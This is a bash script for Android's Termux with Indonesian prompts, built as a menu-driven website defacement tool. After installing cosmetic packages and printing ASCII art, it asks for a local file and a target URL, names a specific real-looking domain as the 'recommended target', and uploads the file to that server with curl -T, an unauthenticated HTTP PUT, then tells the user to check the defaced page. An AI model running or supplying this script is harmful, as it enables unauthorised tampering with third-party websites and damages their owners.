clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
echo $green'Installing'
pkg install figlet && pkg install curl && pkg install libcurl && pkg install ruby
gem install lolcat
clear
echo $white"sedang mengetik"

echo '
                ,’\   |\
               / /.:  ::
              / :’|| //
             (| | ||;’
             / ||,;’-.._
            : ,;,`’;:.--`
            |:|’`-(\\
            ::: \-’\`’
             \\\ \,-`.
              `’\ `.,-`-._      ,-._
       ,-.       \  `.,-’ `-.  / ,..`.
      / ,.`.      `.  \ _.-’ \’,: ``\ \
     / / :..`-’’’``-)  `.   _.:’’  ’’\ \
    : :  ’’ `-..’’`/    |-’’  |’’  ’’ \ \
    | |  ’’   ’’  :     |__..-;’’  ’’  : :
    | |  ’’   ’’  |     ;    / ’’  ’’  | |
    | |  ’’   ’’  ;    /--../_ ’’_ ’’ _| |
    | |  ’’  _;:_/    :._  /-.’’,-.’’,-. |
    : :  ’’,;’`;/     |_ ,(   `’   `’   \|
     \ \  \(   /\     :,’  \
      \ \.’/  : /    ,)    /
       \ ’:   ’:    / \   :
        `.\    :   :\  \  |
                \  | `. \ |..-_
                 ) |.  `/___-.-`
               ,’  -.’.  `. `’        _,)
               \’\(`.\ `._ `-..___..-’,’
                  `’      ``-..___..-
' | lolcat

trap ctrl_c INT
ctrl_c() {
clear
cowsay 'Lagi loading' | lolcat
echo "📆️🕛end the see you,the next time🕧🗓️️" | lolcat
sleep 5
exit
}
figlet "PILIH MENU : " | lolcat
echo
echo "Rekomandasi Daface Web" | lolcat
echo
echo "1.(DEFACE WEB)" | lolcat
echo
echo "0.(KELUAR)" | lolcat
echo
echo $white"isi" | lolcat
echo $green"↙️««️"
echo $green"⬇️"
echo -n $green"↘️➡️➡️➡️➡ »️️ " $blue
read a

if [ $a = 1 ] || [ $a = 1 ]
then
clear
cd /sdcard
toilet -f big -F gay NAMA FILE
echo $white"file harus berada di sdcard"
echo -n $white"ISI NAMA FILE »»  "$cyan
read b
echo
echo $green"nama file"
echo
toilet -f big -F gay $b
echo
toilet -f big -F gay LINK
toilet -f big -F gay TARGET
echo
echo $white"target rekomandasi"
echo $cyan"http://infussion.co.za"
echo
echo -n $white"ISI LINK TARGET » "$cyan
read bb
echo
toilet -f big -F gay $bb
echo
echo "1. lanjut " | lolcat
echo
echo "0. Gak Jadi " | lolcat
echo -n $white"Isi »» : "
read L
if [ $L = 1 ] || [ $L = 1 ]
then
echo
echo $green"sedang ngetik"
curl -T /sdcard/$b $bb
echo
echo $white"silahkan cek di $blue » $green $bb/$b $blue «"
sleep 3
exit
fi
if [ $L = 0 ] || [ $L = 0 ]
then
ctrl_c
fi
fi

if [ $a = 0 ] || [ $a = 0 ]
then
ctrl_c
exit
fi
